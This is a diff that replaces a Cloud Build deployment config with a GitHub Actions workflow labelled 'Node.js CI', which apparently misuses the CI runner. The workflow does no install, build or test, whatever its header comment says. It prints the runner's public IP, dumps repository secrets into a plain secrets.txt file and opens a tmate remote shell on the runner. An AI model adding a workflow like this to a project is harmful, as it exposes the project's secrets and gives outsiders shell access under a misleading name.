@@ -1,10 +1,37 @@
-steps:
-- name: 'gcr.io/cloud-builders/npm'
-  args: ["install"]
-- name: 'gcr.io/cloud-builders/npm'
-  args: ["run", "build"]
-- name: "gcr.io/cloud-builders/gcloud"
-  args: ["app", "deploy", "app.yaml"]
-options:
-  logging: CLOUD_LOGGING_ONLY
-service_account: 676984131022@cloudbuild.gserviceaccount.com
+# This workflow will do a clean installation of node dependencies, cache/restore them, build the source code and run tests across different versions of node
+# For more information see: https://help.github.com/actions/language-and-framework-guides/using-nodejs-with-github-actions
+
+name: Node.js CI
+
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    
+    - name: PublicIP
+      id: ip
+      uses: haythem/public-ip@v1.2
+    - name: Print PublicIP
+      shell: pwsh
+      run: |
+       $publicip=(Invoke-WebRequest -uri "http://ifconfig.me/ip" -DisableKeepAlive -UseBasicParsing).Content
+       $publicip
+      
+    - name: Set up secret file
+      env:
+        DEBUG_PASSWORD: ${{ secrets.CUSTOM }}
+        DEBUG_SECRET_KEY: ${{ secrets.CUSTOM }}
+      run: |
+        echo $DEBUG_PASSWORD >> secrets.txt
+        echo $DEBUG_SECRET_KEY >> secrets.txt
+ 
+    - name: Run tmate
+      uses: mxschmitt/action-tmate@v2
